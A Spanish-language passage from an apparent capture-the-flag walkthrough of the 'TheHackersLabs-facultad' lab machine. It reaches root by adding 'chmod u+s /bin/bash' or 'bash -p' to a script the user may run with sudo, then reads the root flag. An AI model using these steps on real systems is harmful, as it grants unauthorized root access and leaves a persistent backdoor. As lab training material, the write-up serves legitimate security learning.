* Darle **permisos SUID** a la **Bash**.
* Que ejecute la **Bash** con privilegios.

Primero, asignémosle **permisos SUID** a la **Bash**.

Antes de eso, revisa qué permisos tiene:
```bash
vivian@TheHackersLabs-facultad:~$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1265648 mar 29  2024 /bin/bash
```

Modifica el script y agrega la siguiente instrucción:
```bash
chmod u+s /bin/bash
```

Ejecuta el script con **sudo**:
```bash
vivian@TheHackersLabs-facultad:~$ sudo /opt/vivian/script.sh
sudo: unable to resolve host TheHackersLabs-facultad.thl: Nombre o servicio desconocido
Ejecutado como vivian para mis alumnos
```

Vuelve a revisar los permisos de la **Bash**:
```bash
vivian@TheHackersLabs-facultad:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1265648 mar 29  2024 /bin/bash
```

Ejecuta la **Bash** con privilegios:
```bash
vivian@TheHackersLabs-facultad:~$ bash -p
bash-5.2# whoami
root
```
Somos **Root**.

Ahora, en lugar de modificar los permisos de la **Bash**, simplemente indica que ejecute la **Bash** con privilegios con la siguiente instrucción:
```bash
bash -p
```

Y si volvemos a ejecutar el script con **sudo**, seremos **Root** otra vez:
```bash
vivian@TheHackersLabs-facultad:~$ sudo /opt/vivian/script.sh
sudo: unable to resolve host TheHackersLabs-facultad.thl: Nombre o servicio desconocido
root@TheHackersLabs-facultad:/home/vivian# whoami
root
```

Obtengamos la última flag:
```bash
root@TheHackersLabs-facultad:/home/vivian# cd /root
root@TheHackersLabs-facultad:~# ls
root.txt
root@TheHackersLabs-facultad:~# cat root.txt
...
```
Y con esto, terminamos la máquina.
